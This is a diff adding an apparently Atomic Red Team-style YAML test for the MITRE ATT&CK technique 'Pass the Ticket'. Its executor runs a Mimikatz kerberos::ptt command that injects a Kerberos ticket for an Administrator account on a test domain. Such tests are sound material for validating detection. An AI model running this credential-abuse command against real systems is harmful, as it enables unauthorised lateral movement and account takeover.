@@ -1,0 +1,26 @@
+---
+attack_technique: T1097
+display_name: Pass the Ticket
+
+atomic_tests:
+- name: Mimikatz Kerberos Ticket Attack
+  description: |
+    Similar to PTH, but attacking Kerberos
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    user_name:
+      description: username
+      type: string
+      default: Administrator
+    domain:
+      description: domain
+      type: string
+      default: atomic.local
+
+  executor:
+    name: command_prompt
+    command: |
+      mimikatz # kerberos::ptt #{user_name}@#{domain}
